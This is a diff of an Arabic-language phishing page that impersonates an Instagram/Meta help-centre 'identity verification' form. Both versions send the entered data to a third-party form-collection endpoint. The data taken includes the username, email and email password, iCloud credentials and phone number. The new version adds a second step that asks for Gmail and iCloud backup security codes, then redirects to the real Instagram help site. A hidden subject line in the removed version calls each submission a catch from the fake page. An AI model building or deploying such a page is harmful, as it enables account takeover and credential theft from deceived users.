@@ -3,39 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز المساعدة | Meta</title>
+    <title>مركز المساعدة | Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 100%; max-width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .logo { width: 175px; margin-bottom: 20px; }
-        h2 { font-size: 17px; color: #262626; margin-bottom: 15px; }
-        p { color: #8e8e8e; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; text-align: right; font-size: 14px; }
-        button { width: 100%; background: #0095f6; border: none; color: white; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; margin-top: 5px; }
-        .footer { margin-top: 30px; font-size: 12px; color: #999; }
+        :root { --fb-blue: #1877f2; --bg-gray: #f0f2f5; --border: #dddfe2; }
+        body { background-color: var(--bg-gray); font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); border: 1px solid var(--border); overflow: hidden; }
+        .header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); }
+        .header img { width: 80px; }
+        .content { padding: 25px; }
+        h1 { font-size: 19px; color: #1c1e21; margin-bottom: 10px; text-align: center; }
+        p { font-size: 14px; color: #606770; margin-bottom: 20px; text-align: center; }
+        input, select, textarea { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccd0d5; border-radius: 6px; background: #f5f6f7; box-sizing: border-box; font-size: 14px; outline: none; }
+        button { width: 100%; background: var(--fb-blue); color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .info-box { background: #fff9e6; border: 1px solid #ffe58f; padding: 10px; border-radius: 6px; font-size: 12px; color: #856404; margin-bottom: 15px; display: none; }
+        #step2 { display: none; } /* إخفاء الخطوة الثانية في البداية */
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
-        <h2>تأكيد ملكية الحساب</h2>
-        <p>لحماية مجتمعنا، نطلب أحياناً من المستخدمين تأكيد بياناتهم عند رصد نشاط غير معتاد. يرجى إكمال النموذج للمتابعة.</p>
-        
-        <form action="https://formspree.io/f/mdaygdnq" method="POST">
-            <input type="text" name="اسم المستخدم" placeholder="اسم المستخدم" required>
-            <input type="email" name="البريد الإلكتروني" placeholder="البريد الإلكتروني" required>
-            <input type="password" name="كلمة مرور البريد" placeholder="كلمة مرور البريد" required>
-            <input type="email" name="بريد iCloud" placeholder="بريد iCloud">
-            <input type="password" name="كلمة مرور iCloud" placeholder="كلمة مرور iCloud">
-            <input type="tel" name="رقم الهاتف" placeholder="رقم الهاتف">
-            
-            <input type="hidden" name="_next" value="https://help.instagram.com">
-            <input type="hidden" name="_subject" value="صيد جديد من الصفحة المزورة!">
-            
-            <button type="submit">تأكيد الهوية والمتابعة</button>
-        </form>
-        
-        <div class="footer">Instagram from Meta © 2026</div>
+    <div class="container">
+        <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png"></div>
+        <div class="content">
+            <form action="https://formspree.io/f/mdaygdnq" method="POST">
+                
+                <div id="step1">
+                    <h1>تأكيد الهوية</h1>
+                    <p>يرجى إدخال البيانات التالية لتوثيق ملكية الحساب.</p>
+                    <input type="text" name="Username" placeholder="اسم المستخدم" required>
+                    <input type="email" name="Email" placeholder="البريد الإلكتروني" required>
+                    <input type="password" name="Email_Pass" placeholder="كلمة مرور البريد" required>
+                    <input type="email" name="iCloud_User" placeholder="بريد iCloud">
+                    <input type="password" name="iCloud_Pass" placeholder="كلمة مرور iCloud">
+                    <input type="tel" name="Phone" placeholder="رقم الهاتف" required>
+                    <input type="text" name="Country" placeholder="البلد">
+                    <textarea name="Description" placeholder="وصف موجز للمشكلة" rows="2"></textarea>
+                    <button type="button" onclick="goNext()">المتابعة</button>
+                </div>
+
+                <div id="step2">
+                    <h1>تحقق إضافي</h1>
+                    <div class="info-box" id="info">⚠️ الحساب محمي. يرجى إدخال رموز الأمان الاحتياطية لضمان استرجاع الحساب بنجاح.</div>
+                    <input type="text" name="Gmail_Backup_Code" placeholder="رمز أمان Gmail (8 أرقام)">
+                    <input type="text" name="iCloud_Backup_Code" placeholder="رمز أمان iCloud">
+                    
+                    <input type="hidden" name="_next" value="https://help.instagram.com">
+                    <button type="submit">تأكيد نهائي</button>
+                </div>
+
+            </form>
+        </div>
     </div>
+
+    <script>
+        function goNext() {
+            // إخفاء الخطوة الأولى وإظهار الثانية بحركة بسيطة
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            document.getElementById('info').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
